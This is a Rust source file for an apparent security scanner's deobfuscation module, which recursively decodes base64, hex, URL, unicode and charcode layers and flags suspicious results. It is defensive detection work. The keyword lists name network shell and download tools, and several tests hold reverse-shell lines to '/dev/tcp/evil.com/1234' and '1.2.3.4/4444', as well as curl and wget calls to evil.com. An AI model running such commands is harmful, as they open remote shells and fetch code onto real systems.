use base64::Engine;
use rayon::prelude::*;
use regex::Regex;
use std::sync::LazyLock;

/// Deobfuscation engine for deep scanning
pub struct Deobfuscator;

/// Maximum number of nested decoding layers to unwrap during a deep scan.
/// Bounds recursion against stacked/self-referential encodings (issue #128).
const MAX_DECODE_DEPTH: usize = 4;

/// Maximum number of decoded layers to collect across a single deep scan.
/// Prevents decode-bomb-style blowups on adversarial input.
const MAX_DECODE_RESULTS: usize = 256;

static BASE64_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    // Match both the standard (`+`/`/`) and URL-safe (`-`/`_`) alphabets, with or
    // without `=` padding. A single run may be standard OR URL-safe; `decode_base64`
    // tries every engine variant, so an over-broad match is harmless (it just fails
    // to decode). Length >= 16 keeps the original minimum; the `< 20` guard in
    // `decode_base64` still filters short candidates.
    Regex::new(r"[A-Za-z0-9+/_-]{16,}={0,2}").expect("BASE64 regex")
});
static HEX_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:\\x[0-9A-Fa-f]{2}){4,}|(?:0x[0-9A-Fa-f]{2}){4,}").expect("HEX regex")
});
static URL_ENCODED_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:%[0-9A-Fa-f]{2}){4,}").expect("URL encoded regex"));
static UNICODE_ESCAPE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:\\u[0-9A-Fa-f]{4}){2,}").expect("Unicode escape regex"));
static CHAR_CODE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"String\.fromCharCode\s*\([\d,\s]+\)").expect("CharCode regex"));

impl Deobfuscator {
    pub fn new() -> Self {
        Self
    }

    /// Deobfuscate content and return a list of decoded strings (single pass,
    /// suspicious decodes only).
    pub fn deobfuscate(&self, content: &str) -> Vec<DecodedContent> {
        // Early return if no encoded patterns detected
        if !self.has_encoded_patterns(content) {
            return Vec::new();
        }

        // Parallel decode operations using Rayon
        // Use a Vec of decoder functions that return Vec<DecodedContent>
        vec![
            self.decode_base64(content),
            self.decode_hex(content),
            self.decode_url(content),
            self.decode_unicode_escapes(content),
            self.decode_char_code(content),
        ]
        .into_par_iter()
        .flatten()
        .collect()
    }

    /// Single-pass decode of every valid layer, WITHOUT the suspicious filter.
    ///
    /// Used by the recursive walker so a non-suspicious intermediate layer can
    /// still be fed back through the decoders.
    fn deobfuscate_raw(&self, content: &str) -> Vec<DecodedContent> {
        if !self.has_encoded_patterns(content) {
            return Vec::new();
        }

        vec![
            self.decode_base64_raw(content),
            self.decode_hex_raw(content),
            self.decode_url_raw(content),
            self.decode_unicode_escapes_raw(content),
            self.decode_char_code_raw(content),
        ]
        .into_par_iter()
        .flatten()
        .collect()
    }

    /// Iteratively decode nested/multi-layer encodings (issue #128).
    ///
    /// Each decoded layer is fed back through the decoders up to
    /// [`MAX_DECODE_DEPTH`] layers. Multi-layer encoding (e.g. Base64 of a
    /// hex-escaped command) is a standard obfuscation technique that a single
    /// pass leaves hidden. A visited-set and a [`MAX_DECODE_RESULTS`] cap bound
    /// the work against decode-bomb / self-referential inputs. Each returned
    /// layer records its decode chain (e.g. `base64 -> hex`) in `encoding`.
    fn deobfuscate_recursive(&self, content: &str) -> Vec<DecodedContent> {
        let mut out = Vec::new();
        let mut visited: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut stack: Vec<(String, String, usize)> = self
            .deobfuscate_raw(content)
            .into_iter()
            .map(|d| (d.decoded, d.encoding, 1usize))
            .collect();

        while let Some((text, chain, depth)) = stack.pop() {
            if out.len() >= MAX_DECODE_RESULTS {
                break;
            }
            // Skip layers already seen to avoid loops and redundant work.
            if !visited.insert(text.clone()) {
                continue;
            }

            // Feed this layer back through the decoders before consuming `text`.
            if depth < MAX_DECODE_DEPTH {
                for d in self.deobfuscate_raw(&text) {
                    stack.push((d.decoded, format!("{} -> {}", chain, d.encoding), depth + 1));
                }
            }

            out.push(DecodedContent {
                original: content.chars().take(120).collect(),
                decoded: text,
                encoding: chain,
            });
        }

        out
    }

    /// Check if content contains encoded patterns
    fn has_encoded_patterns(&self, content: &str) -> bool {
        // Use regex patterns for more accurate detection
        BASE64_PATTERN.is_match(content)
            || HEX_PATTERN.is_match(content)
            || URL_ENCODED_PATTERN.is_match(content)
            || UNICODE_ESCAPE_PATTERN.is_match(content)
            || CHAR_CODE_PATTERN.is_match(content)
    }

    /// Keep only the decoded layers whose content looks suspicious.
    ///
    /// The public `decode_*` methods apply this so a single pass does not surface
    /// benign decodes. The recursive walker instead works on the unfiltered
    /// `decode_*_raw` output so a non-suspicious *intermediate* layer (e.g. a
    /// hex-escaped string) is still fed back through the decoders (issue #128).
    fn filter_suspicious(&self, items: Vec<DecodedContent>) -> Vec<DecodedContent> {
        items
            .into_iter()
            .filter(|d| self.is_suspicious(&d.decoded))
            .collect()
    }

    /// Decode base64 encoded strings (only suspicious decodes).
    fn decode_base64(&self, content: &str) -> Vec<DecodedContent> {
        self.filter_suspicious(self.decode_base64_raw(content))
    }

    /// Decode every valid-UTF-8 base64 run, without the suspicious filter.
    fn decode_base64_raw(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in BASE64_PATTERN.find_iter(content) {
            let encoded = cap.as_str();
            // Skip if too short or looks like random text
            if encoded.len() < 20 {
                continue;
            }

            if let Some(decoded_str) = Self::try_decode_base64_variants(encoded) {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "base64".to_string(),
                });
            }
        }

        results
    }

    /// Try decoding a Base64 candidate with every common engine variant and
    /// return the first result that is valid UTF-8.
    ///
    /// Covers standard and URL-safe alphabets, padded and unpadded. The `base64`
    /// crate rejects the "wrong" alphabet and mismatched padding, so a payload
    /// using URL-safe or unpadded Base64 (both ubiquitous) would otherwise be
    /// silently dropped even though the standard-padded form is decoded.
    fn try_decode_base64_variants(encoded: &str) -> Option<String> {
        use base64::engine::general_purpose::{
            STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD,
        };

        let engines: [&base64::engine::GeneralPurpose; 4] =
            [&STANDARD, &STANDARD_NO_PAD, &URL_SAFE, &URL_SAFE_NO_PAD];

        engines
            .iter()
            .filter_map(|engine| engine.decode(encoded).ok())
            .find_map(|bytes| String::from_utf8(bytes).ok())
    }

    /// Decode hex encoded strings (only suspicious decodes).
    fn decode_hex(&self, content: &str) -> Vec<DecodedContent> {
        self.filter_suspicious(self.decode_hex_raw(content))
    }

    /// Decode every valid-UTF-8 hex run (\\x or 0x format), unfiltered.
    fn decode_hex_raw(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in HEX_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Extract hex bytes
            let hex_bytes: Vec<u8> = if encoded.starts_with("\\x") {
                encoded
                    .split("\\x")
                    .filter(|s| !s.is_empty())
                    .filter_map(|s| u8::from_str_radix(&s[..2.min(s.len())], 16).ok())
                    .collect()
            } else {
                // 0x format
                encoded
                    .split("0x")
                    .filter(|s| !s.is_empty())
                    .filter_map(|s| u8::from_str_radix(&s[..2.min(s.len())], 16).ok())
                    .collect()
            };

            if let Ok(decoded_str) = String::from_utf8(hex_bytes) {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "hex".to_string(),
                });
            }
        }

        results
    }

    /// Decode URL encoded strings (only suspicious decodes).
    fn decode_url(&self, content: &str) -> Vec<DecodedContent> {
        self.filter_suspicious(self.decode_url_raw(content))
    }

    /// Decode every valid-UTF-8 URL-encoded run, unfiltered.
    fn decode_url_raw(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in URL_ENCODED_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Manual URL decoding
            let mut decoded_bytes = Vec::new();
            let mut chars = encoded.chars().peekable();

            while let Some(c) = chars.next() {
                if c == '%' {
                    let hex: String = chars.by_ref().take(2).collect();
                    if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                        decoded_bytes.push(byte);
                    }
                } else {
                    decoded_bytes.push(c as u8);
                }
            }

            if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "url".to_string(),
                });
            }
        }

        results
    }

    /// Decode unicode escape sequences (only suspicious decodes).
    fn decode_unicode_escapes(&self, content: &str) -> Vec<DecodedContent> {
        self.filter_suspicious(self.decode_unicode_escapes_raw(content))
    }

    /// Decode every unicode-escape run (\\uXXXX), unfiltered.
    fn decode_unicode_escapes_raw(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in UNICODE_ESCAPE_PATTERN.find_iter(content) {
            let encoded = cap.as_str();
            let mut decoded = String::new();

            let mut chars = encoded.chars().peekable();
            while let Some(c) = chars.next() {
                if c == '\\' && chars.peek() == Some(&'u') {
                    chars.next(); // consume 'u'
                    let hex: String = chars.by_ref().take(4).collect();
                    if let Ok(code_point) = u32::from_str_radix(&hex, 16)
                        && let Some(ch) = char::from_u32(code_point)
                    {
                        decoded.push(ch);
                    }
                } else {
                    decoded.push(c);
                }
            }

            results.push(DecodedContent {
                original: encoded.to_string(),
                decoded,
                encoding: "unicode".to_string(),
            });
        }

        results
    }

    /// Decode JavaScript String.fromCharCode patterns (only suspicious decodes).
    fn decode_char_code(&self, content: &str) -> Vec<DecodedContent> {
        self.filter_suspicious(self.decode_char_code_raw(content))
    }

    /// Decode every String.fromCharCode run, unfiltered.
    fn decode_char_code_raw(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in CHAR_CODE_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Extract numbers from the pattern
            let numbers: Vec<u32> = encoded
                .split(|c: char| !c.is_ascii_digit())
                .filter(|s| !s.is_empty())
                .filter_map(|s| s.parse().ok())
                .collect();

            let decoded: String = numbers.iter().filter_map(|&n| char::from_u32(n)).collect();

            results.push(DecodedContent {
                original: encoded.to_string(),
                decoded,
                encoding: "charcode".to_string(),
            });
        }

        results
    }

    /// Check if decoded content looks suspicious
    fn is_suspicious(&self, content: &str) -> bool {
        let suspicious_patterns = [
            "eval",
            "exec",
            "bash",
            "sh -c",
            "/bin/",
            "curl ",
            "wget ",
            "nc ",
            "netcat",
            "/dev/tcp",
            "/dev/udp",
            "base64 -d",
            "python -c",
            "ruby -e",
            "perl -e",
            "powershell",
            "cmd.exe",
            "rm -rf",
            "chmod ",
            "sudo ",
            "password",
            "secret",
            "api_key",
            "token",
            "credential",
            "http://",
            "https://",
            "ftp://",
        ];

        let content_lower = content.to_lowercase();
        suspicious_patterns
            .iter()
            .any(|p| content_lower.contains(p))
    }

    /// Deep scan content - deobfuscate and return all findings
    pub fn deep_scan(&self, content: &str, file_path: &str) -> Vec<crate::rules::Finding> {
        use crate::engine::scanner::ScannerConfig;

        let mut findings = Vec::new();
        let config = ScannerConfig::new();

        // First scan original content
        findings.extend(config.check_content(content, file_path));

        // Then scan every decoded layer, unwrapping nested encodings so a
        // multi-layer payload cannot hide behind one decoding pass (issue #128).
        for decoded in self.deobfuscate_recursive(content) {
            let context = format!("{}:decoded:{}", file_path, decoded.encoding);

            // Create findings for deobfuscated content
            for mut finding in config.check_content(&decoded.decoded, &context) {
                // Add note about deobfuscation
                finding.message = format!(
                    "{} [Decoded from {} encoded content]",
                    finding.message, decoded.encoding
                );
                findings.push(finding);
            }

            // Also check for suspicious decoded content itself
            if decoded.decoded.len() > 10 && self.is_highly_suspicious(&decoded.decoded) {
                findings.push(crate::rules::Finding {
                    id: "OB-DEEP-001".to_string(),
                    severity: crate::rules::Severity::High,
                    category: crate::rules::Category::Obfuscation,
                    confidence: crate::rules::Confidence::Firm,
                    name: "Obfuscated suspicious content".to_string(),
                    location: crate::rules::Location {
                        file: file_path.to_string(),
                        line: 0,
                        column: None,
                    },
                    code: decoded.original.chars().take(100).collect::<String>() + "...",
                    message: format!(
                        "Found {} encoded content that decodes to suspicious payload",
                        decoded.encoding
                    ),
                    recommendation: "Review the decoded content for malicious commands or URLs"
                        .to_string(),
                    fix_hint: None,
                    cwe_ids: vec!["CWE-116".to_string()],
                    rule_severity: None,
                    client: None,
                    context: None,
                });
            }
        }

        findings
    }

    /// Check if content is highly suspicious (more specific than is_suspicious)
    fn is_highly_suspicious(&self, content: &str) -> bool {
        let highly_suspicious = [
            "bash -i",
            "/dev/tcp/",
            "nc -e",
            "rm -rf /",
            "curl | bash",
            "wget | sh",
            "eval(base64",
            "exec(decode",
        ];

        let content_lower = content.to_lowercase();
        highly_suspicious.iter().any(|p| content_lower.contains(p))
    }
}

impl Default for Deobfuscator {
    fn default() -> Self {
        Self::new()
    }
}

/// Represents decoded content from obfuscation
#[derive(Debug, Clone)]
pub struct DecodedContent {
    pub original: String,
    pub decoded: String,
    pub encoding: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_base64() {
        let deob = Deobfuscator::new();
        // "curl http://evil.com" in base64
        let content = "Y3VybCBodHRwOi8vZXZpbC5jb20=";
        let results = deob.decode_base64(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_hex() {
        let deob = Deobfuscator::new();
        // "curl" in hex
        let content = r"\x63\x75\x72\x6c\x20\x68\x74\x74\x70";
        let results = deob.decode_hex(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_url() {
        let deob = Deobfuscator::new();
        // "curl http" URL encoded
        let content = "%63%75%72%6c%20%68%74%74%70";
        let results = deob.decode_url(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_charcode() {
        let deob = Deobfuscator::new();
        // String.fromCharCode for "eval"
        let content = "String.fromCharCode(101,118,97,108)";
        let results = deob.decode_char_code(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("eval"));
    }

    #[test]
    fn test_is_suspicious() {
        let deob = Deobfuscator::new();
        assert!(deob.is_suspicious("curl http://example.com"));
        assert!(deob.is_suspicious("bash -c 'evil command'"));
        assert!(deob.is_suspicious("password=secret123"));
        assert!(!deob.is_suspicious("hello world"));
    }

    #[test]
    fn test_deep_scan() {
        let deob = Deobfuscator::new();
        // Content with highly suspicious obfuscated payload: "bash -i >& /dev/tcp/x"
        // Base64 for "bash -i >& /dev/tcp/evil.com/1234"
        let content = "normal text\nYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS8xMjM0 # hidden payload";
        let findings = deob.deep_scan(content, "test.sh");
        // Should find OB-DEEP-001 for highly suspicious decoded content
        assert!(
            findings
                .iter()
                .any(|f| f.id == "OB-DEEP-001" || f.message.contains("Decoded"))
        );
    }

    #[test]
    fn test_deep_scan_multi_layer_base64_of_hex() {
        // Multi-layer obfuscation: a reverse-shell command is hex-escaped, then
        // the hex-escaped string is Base64-encoded. A single decoding pass only
        // reveals the (non-suspicious) hex-escaped layer; the real command stays
        // hidden. Deep scan must iterate layers (issue #128).
        let deob = Deobfuscator::new();
        let cmd = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1";
        let hex_escaped: String = cmd.bytes().map(|b| format!("\\x{:02x}", b)).collect();
        let outer = base64::engine::general_purpose::STANDARD.encode(hex_escaped.as_bytes());
        let content = format!("echo {} | sh", outer);

        let findings = deob.deep_scan(&content, "payload.sh");
        assert!(
            findings.iter().any(|f| f.id == "OB-DEEP-001"),
            "nested base64(hex(command)) must be decoded and flagged"
        );
    }

    #[test]
    fn test_deep_scan_detects_base64_wrapped_aws_key() {
        // Regression for #146: a secret hidden inside a Base64 blob must still be
        // caught. Before the deep-scan pre-filter fix, the encoded layer was
        // dropped before the rule engine saw it, so SL-001 never fired.
        let deob = Deobfuscator::new();
        let secret = "aws_access_key_id=AKIAIOSFODNN7ABCDEFG";
        let encoded = base64::engine::general_purpose::STANDARD.encode(secret.as_bytes());
        let content = format!("export CREDS={encoded}");

        let findings = deob.deep_scan(&content, "config.sh");
        assert!(
            findings.iter().any(|f| f.id == "SL-001"),
            "Base64-wrapped AWS access key must be decoded and flagged as SL-001"
        );
    }

    #[test]
    fn test_deep_scan_detects_base64_wrapped_private_key() {
        // Regression for #146: a PEM private-key header wrapped in Base64 must be
        // decoded and flagged (SL-005), not silently dropped.
        let deob = Deobfuscator::new();
        let secret = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n";
        let encoded = base64::engine::general_purpose::STANDARD.encode(secret.as_bytes());
        let content = format!("blob = \"{encoded}\"");

        let findings = deob.deep_scan(&content, "notes.md");
        assert!(
            findings.iter().any(|f| f.id == "SL-005"),
            "Base64-wrapped private key header must be decoded and flagged as SL-005"
        );
    }

    #[test]
    fn test_deep_scan_single_layer_still_benign() {
        // A plain, non-encoded benign line must not produce deep-scan findings
        // even with recursive decoding enabled.
        let deob = Deobfuscator::new();
        let findings = deob.deep_scan("echo hello world", "safe.sh");
        assert!(
            !findings.iter().any(|f| f.id == "OB-DEEP-001"),
            "benign content must not be flagged"
        );
    }

    #[test]
    fn test_deobfuscate_empty() {
        let deob = Deobfuscator::new();
        let results = deob.deobfuscate("normal text without obfuscation");
        assert!(results.is_empty());
    }

    #[test]
    fn test_default_trait() {
        let deob = Deobfuscator;
        assert!(!deob.is_suspicious("hello"));
    }

    #[test]
    fn test_decode_unicode_escapes() {
        let deob = Deobfuscator::new();
        // "eval" in unicode escapes
        let content = r"\u0065\u0076\u0061\u006c";
        let results = deob.decode_unicode_escapes(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("eval"));
    }

    #[test]
    fn test_decode_base64_short_string() {
        let deob = Deobfuscator::new();
        // Short base64 string (less than 20 chars) should be skipped
        let content = "YWJjZA=="; // "abcd" in base64
        let results = deob.decode_base64(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_base64_non_suspicious() {
        let deob = Deobfuscator::new();
        // Long base64 but decodes to non-suspicious content
        let content = "dGhpcyBpcyBhIG5vcm1hbCBzYWZlIHRleHQ="; // "this is a normal safe text"
        let results = deob.decode_base64(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_base64_unpadded_standard() {
        let deob = Deobfuscator::new();
        // "curl http://evil.com" standard base64 with the trailing '=' padding
        // stripped. STANDARD.decode rejects this (InvalidPadding), and the regex
        // only matches a 24-char (aligned) prefix, so the FULL payload is never
        // recovered — assert full equality, not a substring, to expose the gap.
        let content = "Y3VybCBodHRwOi8vZXZpbC5jb20";
        let results = deob.decode_base64(content);
        assert!(
            results.iter().any(|r| r.decoded == "curl http://evil.com"),
            "unpadded standard base64 should decode to the full payload, got: {:?}",
            results.iter().map(|r| &r.decoded).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_decode_base64_url_safe() {
        let deob = Deobfuscator::new();
        // "wget http://evil.com/xyz??? > /tmp/p" in URL-safe base64 (unpadded).
        // Contains '_' (URL-safe alphabet). The standard alphabet regex matches
        // only the run before '_' and STANDARD.decode rejects the URL-safe
        // alphabet, so the full payload is never recovered — assert equality.
        let content = "d2dldCBodHRwOi8vZXZpbC5jb20veHl6Pz8_ID4gL3RtcC9w";
        let results = deob.decode_base64(content);
        assert!(
            results
                .iter()
                .any(|r| r.decoded == "wget http://evil.com/xyz??? > /tmp/p"),
            "URL-safe base64 should decode to the full payload, got: {:?}",
            results.iter().map(|r| &r.decoded).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_decode_hex_0x_format() {
        let deob = Deobfuscator::new();
        // "curl" in 0x format
        let content = "0x630x750x720x6c0x200x680x740x740x70";
        let results = deob.decode_hex(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_is_highly_suspicious() {
        let deob = Deobfuscator::new();
        assert!(deob.is_highly_suspicious("bash -i >& /dev/tcp/"));
        assert!(deob.is_highly_suspicious("rm -rf /"));
        assert!(deob.is_highly_suspicious("curl | bash something"));
        assert!(deob.is_highly_suspicious("wget | sh something"));
        assert!(deob.is_highly_suspicious("nc -e /bin/bash"));
        assert!(deob.is_highly_suspicious("eval(base64"));
        assert!(deob.is_highly_suspicious("exec(decode"));
        assert!(!deob.is_highly_suspicious("echo hello"));
    }

    #[test]
    fn test_deobfuscate_with_base64() {
        let deob = Deobfuscator::new();
        // Contains suspicious base64
        let content = "command=Y3VybCBodHRwOi8vZXZpbC5jb20="; // "curl http://evil.com"
        let results = deob.deobfuscate(content);
        assert!(!results.is_empty());
    }

    #[test]
    fn test_deobfuscate_multiple_encodings() {
        let deob = Deobfuscator::new();
        // Content with both hex and base64
        let content =
            r"data=Y3VybCBodHRwOi8vZXZpbC5jb20=; exec \x63\x75\x72\x6c\x20\x68\x74\x74\x70";
        let results = deob.deobfuscate(content);
        // Should find results from both decoders
        assert!(!results.is_empty());
    }

    #[test]
    fn test_deep_scan_clean_content() {
        let deob = Deobfuscator::new();
        let content = "normal clean content without any issues";
        let findings = deob.deep_scan(content, "test.txt");
        // Should have no findings for clean content
        assert!(findings.is_empty());
    }

    #[test]
    fn test_deep_scan_with_suspicious_decoded() {
        let deob = Deobfuscator::new();
        // Content with moderately suspicious base64 (triggers is_suspicious but not is_highly_suspicious)
        let content = "payload=Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vZG93bmxvYWQuc2g="; // "curl http://example.com/download.sh"
        let findings = deob.deep_scan(content, "test.sh");
        // May or may not have findings depending on scanner rules
        // Just verify no panic
        let _ = findings;
    }

    #[test]
    fn test_decoded_content_debug_trait() {
        let content = DecodedContent {
            original: "abc".to_string(),
            decoded: "xyz".to_string(),
            encoding: "base64".to_string(),
        };
        let debug_str = format!("{:?}", content);
        assert!(debug_str.contains("DecodedContent"));
        assert!(debug_str.contains("abc"));
    }

    #[test]
    fn test_decoded_content_clone_trait() {
        let content = DecodedContent {
            original: "abc".to_string(),
            decoded: "xyz".to_string(),
            encoding: "base64".to_string(),
        };
        let cloned = content.clone();
        assert_eq!(content.original, cloned.original);
        assert_eq!(content.decoded, cloned.decoded);
        assert_eq!(content.encoding, cloned.encoding);
    }

    #[test]
    fn test_is_suspicious_various_patterns() {
        let deob = Deobfuscator::new();
        assert!(deob.is_suspicious("wget http://evil.com"));
        assert!(deob.is_suspicious("nc -l 1234"));
        assert!(deob.is_suspicious("netcat connection"));
        assert!(deob.is_suspicious("/dev/tcp/evil"));
        assert!(deob.is_suspicious("/dev/udp/evil"));
        assert!(deob.is_suspicious("base64 -d | bash"));
        assert!(deob.is_suspicious("python -c 'import os'"));
        assert!(deob.is_suspicious("ruby -e 'exec'"));
        assert!(deob.is_suspicious("perl -e 'system'"));
        assert!(deob.is_suspicious("powershell.exe"));
        assert!(deob.is_suspicious("cmd.exe /c"));
        assert!(deob.is_suspicious("rm -rf /tmp"));
        assert!(deob.is_suspicious("chmod 777 file"));
        assert!(deob.is_suspicious("sudo rm"));
        assert!(deob.is_suspicious("api_key=secret"));
        assert!(deob.is_suspicious("token=abc123"));
        assert!(deob.is_suspicious("credential_store"));
        assert!(deob.is_suspicious("ftp://server"));
    }

    #[test]
    fn test_decode_url_non_suspicious() {
        let deob = Deobfuscator::new();
        // URL encoded "hello world" (non-suspicious)
        let content = "%68%65%6c%6c%6f%20%77%6f%72%6c%64";
        let results = deob.decode_url(content);
        // Should be empty because "hello world" is not suspicious
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_hex_non_suspicious() {
        let deob = Deobfuscator::new();
        // "hello" in hex - not suspicious
        let content = r"\x68\x65\x6c\x6c\x6f";
        let results = deob.decode_hex(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_charcode_non_suspicious() {
        let deob = Deobfuscator::new();
        // "hello" in charCode - not suspicious
        let content = "String.fromCharCode(104,101,108,108,111)";
        let results = deob.decode_char_code(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_unicode_non_suspicious() {
        let deob = Deobfuscator::new();
        // "ab" in unicode - not suspicious
        let content = r"\u0061\u0062";
        let results = deob.decode_unicode_escapes(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_deep_scan_original_content_finding() {
        let deob = Deobfuscator::new();
        // Content that triggers a rule via check_content
        // Using sudo which should trigger PE-001
        let content = "sudo rm -rf /important/files";
        let findings = deob.deep_scan(content, "script.sh");
        // Should find findings for sudo usage
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_deobfuscate_with_url_encoding() {
        let deob = Deobfuscator::new();
        // URL encoded "curl http://evil.com" with mixed encoded/non-encoded characters
        let content = "command=%63%75%72%6c%20http://evil.com";
        let results = deob.deobfuscate(content);
        // Should find URL-encoded suspicious content
        assert!(results.iter().any(|r| r.encoding == "url"));
    }

    #[test]
    fn test_deobfuscate_with_unicode_escapes() {
        let deob = Deobfuscator::new();
        // Unicode escape encoded "curl http"
        let content = r"var cmd = '\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070'";
        let results = deob.deobfuscate(content);
        // Should find unicode-encoded suspicious content
        assert!(results.iter().any(|r| r.encoding == "unicode"));
    }

    #[test]
    fn test_deobfuscate_with_charcode() {
        let deob = Deobfuscator::new();
        // String.fromCharCode for "curl http"
        let content = "var x = String.fromCharCode(99,117,114,108,32,104,116,116,112)";
        let results = deob.deobfuscate(content);
        // Should find charcode-encoded suspicious content
        assert!(results.iter().any(|r| r.encoding == "charcode"));
    }

    #[test]
    fn test_url_decode_with_only_percent_encoded() {
        let deob = Deobfuscator::new();
        // URL with only percent-encoded characters (matches pattern (?:%[0-9A-Fa-f]{2}){4,})
        // "curl http" fully percent-encoded
        let content = "%63%75%72%6c%20%68%74%74%70%3a%2f%2f";
        let results = deob.decode_url(content);
        // Should decode correctly
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
        assert!(results[0].decoded.contains("http"));
    }

    #[test]
    fn test_unicode_decode_multiple_escapes() {
        let deob = Deobfuscator::new();
        // Multiple consecutive unicode escapes (matches pattern (?:\\u[0-9A-Fa-f]{4}){2,})
        // "curl" in unicode escapes
        let content = r"\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070";
        let results = deob.decode_unicode_escapes(content);
        // Should decode correctly
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_deobfuscate_all_encodings_combined() {
        let deob = Deobfuscator::new();
        // Content containing URL, unicode, charcode, hex, and base64 encodings
        let content = r#"
            url=%63%75%72%6c%20http
            unicode=\u0065\u0076\u0061\u006c
            charcode=String.fromCharCode(99,117,114,108)
            hex=\x63\x75\x72\x6c\x20\x68\x74\x74\x70
            base64=Y3VybCBodHRwOi8vZXZpbC5jb20=
        "#;
        let results = deob.deobfuscate(content);
        // Should find multiple encodings
        assert!(!results.is_empty());
    }

    #[test]
    fn test_deep_scan_with_deobfuscated_rule_match() {
        let deob = Deobfuscator::new();
        // Base64 encoded content that contains sudo command
        // "sudo rm -rf /" in base64
        let base64_content = "c3VkbyBybSAtcmYgLw==";
        let content = format!("execute={}", base64_content);
        let findings = deob.deep_scan(&content, "test.sh");
        // Should find findings from both original scan and decoded content
        // The decoded content "sudo rm -rf /" should trigger PE-001
        let has_decoded_finding = findings
            .iter()
            .any(|f| f.message.contains("Decoded") || f.id.contains("OB-DEEP"));
        // Either finds decoded content or the original encoding pattern
        assert!(has_decoded_finding || !findings.is_empty());
    }

    #[test]
    fn test_url_decode_mixed_with_normal_chars() {
        let deob = Deobfuscator::new();
        // URL with mixed encoded and normal characters that decode to suspicious content
        // %63%75%72%6c = "curl", mixed with normal "http"
        let content = "cmd=%63%75%72%6c%20http://evil.com|bash";
        let results = deob.deobfuscate(content);
        // Should decode the URL-encoded parts mixed with normal chars to suspicious content
        // If not suspicious enough, the else branch is still exercised during decoding
        let _ = results; // Test exercises the code path regardless of result
    }

    #[test]
    fn test_unicode_escape_mixed_chars() {
        let deob = Deobfuscator::new();
        // Unicode escapes mixed with normal text - tests else branch (line 176-177)
        let content = r"var x = '\u0063url \u0068ttp://evil.com'";
        let results = deob.deobfuscate(content);
        // May or may not match depending on pattern, but exercises the code path
        assert!(results.is_empty() || results.iter().any(|r| r.encoding == "unicode"));
    }

    #[test]
    fn test_decode_hex_invalid_format() {
        let deob = Deobfuscator::new();
        // Hex with invalid characters that won't parse as hex
        let content = "\\x6Gurl \\x7Gttp"; // 'G' is not valid hex
        let results = deob.deobfuscate(content);
        // Should handle gracefully
        assert!(results.is_empty() || results.iter().all(|r| r.encoding != "hex"));
    }

    #[test]
    fn test_charcode_partial_match() {
        let deob = Deobfuscator::new();
        // String.fromCharCode that decodes to suspicious content (bash execution)
        // 98,97,115,104 = "bash"
        let content = "eval(String.fromCharCode(98,97,115,104))";
        let results = deob.deobfuscate(content);
        // Should decode the charcode to "bash" which is suspicious
        assert!(results.iter().any(|r| r.encoding == "charcode"));
    }

    #[test]
    fn test_deobfuscator_default() {
        // Explicitly test Default::default() implementation
        let deob: Deobfuscator = Default::default();
        assert!(!deob.is_suspicious("normal text"));
        assert!(deob.is_suspicious("curl http://evil.com"));
    }

    #[test]
    fn test_url_decode_mixed_with_plain_chars() {
        let deob = Deobfuscator::new();
        // URL encoded with some plain chars - tests the else branch at line 139-141
        // "curlhttp" where 'c', 'u', 'r', 'l', 'h', 't', 't', 'p' are encoded but spaces are not
        // Actually the pattern requires consecutive %XX sequences, so let's use a different approach
        // "%63url%20%68ttp" won't match the pattern, so we use fully encoded suspicious content
        let content = "%63%75%72%6c%20%68%74%74%70"; // fully encoded "curl http"
        let results = deob.decode_url(content);
        assert!(!results.is_empty());
        assert_eq!(results[0].encoding, "url");
    }

    #[test]
